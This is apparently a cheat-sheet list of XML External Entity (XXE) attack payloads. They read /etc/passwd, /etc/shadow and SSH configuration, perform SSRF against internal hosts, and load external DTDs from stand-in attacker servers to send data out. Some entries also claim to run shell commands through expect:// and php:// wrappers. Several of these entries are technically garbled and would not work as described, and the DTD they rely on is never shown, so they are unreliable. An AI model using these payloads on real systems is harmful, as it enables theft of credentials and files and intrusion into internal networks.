- Injecting a local file on the server, such as /etc/passwd, into the XML document:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

- Injecting a remote file, such as a file hosted on a malicious server controlled by the attacker, into the XML document:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml" >]>
<foo>&xxe;</foo>
```

- Injecting a server-side request forgery (SSRF) attack to access internal network resources:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://internal.company.com/secret.php" >]>
<foo>&xxe;</foo>
```

- Read the `/etc/services` files from the server's file system

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/services" >]>
<foo>&xxe;</foo>
```

- Read the `/etc/ssh/ssh_config` file from the server's file system

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/ssh/ssh_config" >]>
<foo>&xxe;</foo>
```

- A payload that reads the `/etc/shadow` file and extracts password hashes for all users on the system

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>
```

- Connect to an internal server and receive a sensitive data (e.g. user login credentials)

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
    %dtd;]>
    <foo>
        <user>
            &file;
        </user>
    </foo>
```

- Run a shell command on the server to gain access to command line. This payload uses the `php://` protocol handler to run a `ls` command on the server, which will list the contents of the current directory. The output of the command is then encoded using base64 and sent to the attacker-controlled server.

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=expect://ls">
    <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
    %dtd;]>
    <foo>
        <command>
            &data;
        </command>
    </foo>
```

- Connect to the internal server and download a file.

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % data SYSTEM "expect://spawn scp attacker@attacker-controlled-server.com:/path/to/file.txt">
    <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
    %dtd;]>
    <foo>
        <command>
            &data;
        </command>
    </foo>
```

- Include a file from server's file system as a data URI

```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % data SYSTEM "data://text/plain;base64,file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
    %dtd;]>
    <foo>
        <file>
            &data;
        </file>
    </foo>
```
